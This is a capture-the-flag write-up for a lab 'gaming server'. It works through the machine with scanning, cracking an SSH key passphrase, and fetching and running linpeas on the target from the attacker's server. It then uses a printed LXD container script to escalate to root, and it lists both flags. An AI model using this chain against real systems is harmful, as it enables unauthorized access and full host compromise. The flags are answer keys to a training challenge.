# Task 1 Boot2Root
----

>>Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.

----

## SCANNING 

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nmap -sC -sV 10.10.23.171
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 02:08 EST
Nmap scan report for 10.10.23.171
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.25 seconds

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ gobuster dir -u http://10.10.23.171 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.23.171
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/22 02:10:13 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/robots.txt           (Status: 200) [Size: 33] 
/secret               (Status: 301) [Size: 313] [--> http://10.10.23.171/secret/]
/server-status        (Status: 403) [Size: 277]                                  
/uploads              (Status: 301) [Size: 314] [--> http://10.10.23.171/uploads/]
                                                                                  
===============================================================
2022/01/22 02:19:34 Finished
===============================================================

```

>> Found the dict.lst in this url below 
URL : http://10.10.23.171/uploads/dict.lst 

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ wget http://10.10.23.171/uploads/dict.lst 
--2022-01-22 02:12:59--  http://10.10.23.171/uploads/dict.lst
Connecting to 10.10.23.171:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2006 (2.0K)
Saving to: ‘dict.lst’

dict.lst                       100%[====================================================>]   1.96K  --.-KB/s    in 0s      

2022-01-22 02:13:00 (10.7 MB/s) - ‘dict.lst’ saved [2006/2006]

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nano id_rsa      
                                                                                                                            
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ chmod 600 id_rsa      

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ python3 /usr/share/john/ssh2john.py id_rsa > forjohn.txt

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ john --wordlist=/home/rawbot/dict.lst forjohn.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (id_rsa)     
1g 0:00:00:00 DONE (2022-01-22 02:33) 16.66g/s 3700p/s 3700c/s 3700C/s baseball..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```                       

## LOGGING IN AS USER JOHN

>> Found the username by inspecting the source code.

```html
</body>
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
</html>
```

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ ssh -i id_rsa john@10.10.23.171
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jan 22 07:42:13 UTC 2022

  System load:  0.0               Processes:           98
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 33%               IP address for eth0: 10.10.23.171
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ 
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt 
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e

```

## PRIVILEGE ESCALATION

>> With linpeas we found the user is in lxd group with that we can escalate our privilege as root. 

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.23.171 - - [22/Jan/2022 02:58:47] code 404, message File not found
10.10.23.171 - - [22/Jan/2022 02:58:47] "GET /home/rawbot/linpeas.sh HTTP/1.1" 404 -
10.10.23.171 - - [22/Jan/2022 02:59:05] "GET /linpeas.sh HTTP/1.1" 200 -

john@exploitable:~$ wget http://10.9.1.204:8000/linpeas.sh
--2022-01-22 07:56:40--  http://10.9.1.204:8000/linpeas.sh
Connecting to 10.9.1.204:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 305316 (298K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                     100%[====================================================>] 298.16K   198KB/s    in 1.5s    

2022-01-22 07:56:42 (198 KB/s) - ‘linpeas.sh’ saved [305316/305316]

john@exploitable:~$ ls
linpeas.sh  user.txt
john@exploitable:~$ chmod +x linpeas.sh 
john@exploitable:~$ ./linpeas.sh

john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

>> Using this script to escalate our privilege as root.

```bash
#!/usr/bin/env bash

# ----------------------------------
# Authors: Marcelo Vazquez (S4vitar)
#	   Victor Lasa      (vowkin)
# ----------------------------------

# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine

function helpPanel(){
  echo -e "\nUsage:"
  echo -e "\t[-f] Filename (.tar.gz alpine file)"
  echo -e "\t[-h] Show this help panel\n"
  exit 1
}

function createContainer(){
  lxc image import $filename --alias alpine && lxd init --auto
  echo -e "[*] Listing images...\n" && lxc image list
  lxc init alpine privesc -c security.privileged=true
  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc sh
  cleanup
}

function cleanup(){
  echo -en "\n[*] Removing container..."
  lxc stop privesc && lxc delete privesc && lxc image delete alpine
  echo " [√]"
}

set -o nounset
set -o errexit

declare -i parameter_enable=0; while getopts ":f:h:" arg; do
  case $arg in
    f) filename=$OPTARG && let parameter_enable+=1;;
    h) helpPanel;;
  esac
done

if [ $parameter_enable -ne 1 ]; then
  helpPanel
else
  createContainer
fi
```

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine 
--2022-01-22 03:21:58--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8060 (7.9K) [text/plain]
Saving to: ‘build-alpine’

build-alpine                   100%[====================================================>]   7.87K  --.-KB/s    in 0.005s  

2022-01-22 03:21:59 (1.68 MB/s) - ‘build-alpine’ saved [8060/8060]
                                                                                                                          
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ ls
build-alpine   Desktop   Documents  forjohn.txt  id_rsa      lxd-privesc.sh  Music     Public     Videos
cybersecurity  dict.lst  Downloads  gitclones    linpeas.sh  meme.jpg        Pictures  Templates
                                                                                                                            
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ chmod +x build-alpine 

┌[root💀pwnbox]─[/home/rawbot]
└╼[★]$ ./build-alpine 
Determining the latest release... v3.15
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.15/main/x86_64
Downloading alpine-keys-2.4-r1.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-2.12.7-r3.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK
Verified OK
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--       0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--       0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--       0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--       0     0    0     0    0     0      0      0 --:--:--  0:00:03 --:--:--       0     0    0     0    0     0      0      0 --:--:--  0:00:04 --:--:--       0     0    0     0    0     0      0      0 --:--:--  0:00:05 --:--:--       0     0    0     0    0     0      0      0 --:--:--  0:00:06 --:--:--       0     0    0     0    0     0      0      0 --:--:--  0:00:07 --:--:--       0     0    0     0    0     0      0      0 --:--:--  0:00:08 --:--:--     100  2132  100  2132    0     0    230      0  0:00:09  0:00:09 --:--:--   433
--2022-01-22 03:26:14--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106
Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2132 (2.1K) [text/plain]
Saving to: ‘/home/rawbot/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’

/home/rawbot/rootfs 100%[================>]   2.08K  --.-KB/s    in 0s      

2022-01-22 03:26:15 (19.2 MB/s) - ‘/home/rawbot/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [2132/2132]

Selecting mirror http://mirror.xtom.com.hk/alpine//v3.15/main
fetch http://mirror.xtom.com.hk/alpine//v3.15/main/x86_64/APKINDEX.tar.gz
(1/20) Installing musl (1.2.2-r7)
(2/20) Installing busybox (1.34.1-r3)
Executing busybox-1.34.1-r3.post-install
(3/20) Installing alpine-baselayout (3.2.0-r18)
Executing alpine-baselayout-3.2.0-r18.pre-install
Executing alpine-baselayout-3.2.0-r18.post-install
(4/20) Installing ifupdown-ng (0.11.3-r0)
(5/20) Installing openrc (0.44.7-r3)
Executing openrc-0.44.7-r3.post-install
(6/20) Installing alpine-conf (3.13.0-r0)
(7/20) Installing ca-certificates-bundle (20211220-r0)
(8/20) Installing libcrypto1.1 (1.1.1l-r8)
(9/20) Installing libssl1.1 (1.1.1l-r8)
(10/20) Installing libretls (3.3.4-r2)
(11/20) Installing ssl_client (1.34.1-r3)
(12/20) Installing zlib (1.2.11-r3)
(13/20) Installing apk-tools (2.12.7-r3)
(14/20) Installing busybox-suid (1.34.1-r3)
(15/20) Installing busybox-initscripts (4.0-r5)
Executing busybox-initscripts-4.0-r5.post-install
(16/20) Installing scanelf (1.3.3-r0)
(17/20) Installing musl-utils (1.2.2-r7)
(18/20) Installing libc-utils (0.7.2-r3)
(19/20) Installing alpine-keys (2.4-r1)
(20/20) Installing alpine-base (3.15.0-r0)
Executing busybox-1.34.1-r3.trigger
OK: 9 MiB in 20 packages
                                                                                                                          
┌[root💀pwnbox]─[/home/rawbot]
└╼[★]$ ls 
alpine-v3.15-x86_64-20220122_0326.tar.gz  Downloads       meme.jpg
build-alpine                              forjohn.txt     Music
cybersecurity                             gitclones       Pictures
Desktop                                   id_rsa          Public
dict.lst                                  linpeas.sh      Templates
Documents                                 lxd-privesc.sh  Videos

┌[root💀pwnbox]─[/home/rawbot]
└╼[★]$ scp -i id_rsa alpine-v3.15-x86_64-20220122_0326.tar.gz getroot john@10.10.53.39:/tmp     
The authenticity of host '10.10.53.39 (10.10.53.39)' can't be established.
ED25519 key fingerprint is SHA256:3Kz4ZAujxMQpTzzS0yLL9dLKLGmA1HJDOLAQWfmcabo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.53.39' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
alpine-v3.15-x86_64-20220122_0326.tar.gz   100% 3160KB 145.5KB/s   00:21    
getroot                                    100% 1464     6.0KB/s   00:00  

john@exploitable:~$ cd /tmp
john@exploitable:/tmp$ ls
alpine-v3.15-x86_64-20220122_0326.tar.gz
getroot
systemd-private-57b5df265ea54a5da37f78f277499a4b-apache2.service-8AJvbY
systemd-private-57b5df265ea54a5da37f78f277499a4b-systemd-resolved.service-lIThHr
systemd-private-57b5df265ea54a5da37f78f277499a4b-systemd-timesyncd.service-FXCs1w

john@exploitable:/tmp$ chmod +x getroot 

john@exploitable:/tmp$ ./getroot -f alpine-v3.15-x86_64-20220122_0326.tar.gz 
Image imported with fingerprint: b6f5e2e7cdf0fdb88a9ee4643500aa7e710779758d4431fc1bd14853c8ffce2d
[*] Listing images...

+--------+--------------+--------+-------------------------------+--------+--------+-----------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  | UPLOAD DATE     |
+--------+--------------+--------+-------------------------------+--------+--------+-----------------+
| alpine | b6f5e2e7cdf0 | no     | alpine v3.15 (20220122_03:26) | x86_64 | 3.09MB | Jan 22, 2022 at 
                                                                                        8:36am (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+-----------------+
Creating privesc
Device giveMeRoot added to privesc
~ # 
~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root
/mnt/root # ls
bin             etc             lib             mnt             run             swap.img        var
boot            home            lib64           opt             sbin            sys             vmlinuz
cdrom           initrd.img      lost+found      proc            snap            tmp             vmlinuz.old
dev             initrd.img.old  media           root            srv             usr
/mnt/root # cd root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt 
2e337b8c9f3aff0c2b3e8d4e6a7c88fc

```

----

# ANSWER THE QUESTIONS :  
----

1.What is the user flag?
>>a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e

2.What is the root flag?
>>2e337b8c9f3aff0c2b3e8d4e6a7c88fc

----